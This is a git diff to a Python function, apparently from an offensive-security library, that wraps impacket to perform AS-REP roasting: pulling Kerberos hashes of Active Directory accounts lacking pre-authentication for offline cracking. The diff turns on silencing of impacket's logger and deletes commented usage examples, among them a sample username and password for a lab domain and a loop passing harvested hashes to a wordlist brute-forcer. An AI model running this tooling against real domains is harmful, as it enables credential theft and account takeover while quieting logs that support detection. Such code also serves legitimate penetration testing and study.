@@ -2,6 +2,7 @@ from pympacket.attacks.GetNPUsers import GetUserNoPreAuth
 from argparse import Namespace
 import sys
 from pympacket.models.common import User, Hash
+import logging
 
 def asreproast(domain, dc_ip, username='', password='', nthash=None, usersfile=None):
     if nthash is not None:
@@ -17,10 +18,10 @@ def asreproast(domain, dc_ip, username='', password='', nthash=None, usersfile=N
         request = True
         usersfile = None # Ignore usersfile value when calling with creds
     elif usersfile is None: # If an usersfile is not provided when calling without creds
-        print("You must specify a list of users to check.", file=sys.stderr)
+        print("You must specify a list of users to check.\n", file=sys.stderr)
         return None
 
-    #logging.disable(sys.maxsize) #Disable impacket logger
+    logging.disable(sys.maxsize) #Disable impacket logger
     cmdLineOptions = Namespace(
         no_pass=no_pass,
         outputfile=None,
@@ -47,24 +48,6 @@ def asreproast(domain, dc_ip, username='', password='', nthash=None, usersfile=N
             current_hash.value = asrep
             current_user.krb_hash = [current_hash]
             result.append(current_user)
-            #user_result = {}
-            #user_result['username'] = user
-            #user_result['asrep'] = asrep
-            #result.append(user_result)
         return result
     else:
         return None
-
-# Output is a list of dict in the following format, None if error:
-# [{'username':'svc_sql', 'asrep':'$krb5asrep$...'}]
-
-#asrep_out = asreproast(dc_ip='192.168.56.133', domain='contoso.local', usersfile='SamAccountNames.txt') # Unauth
-#asrep_out = asreproast(dc_ip='192.168.116.10', username='l.douglas', password='Football1', domain='contoso.local') # Auth
-
-#print(asrep_out)
-#
-#if asrep_out is not None:
-#    for asrep in asrep_out:
-#        result = bruteforce('fasttrack.txt', asrep['asrep'], 'asrep')
-#        if result is not None:
-#            print(f"{asrep['username']}:{result}")
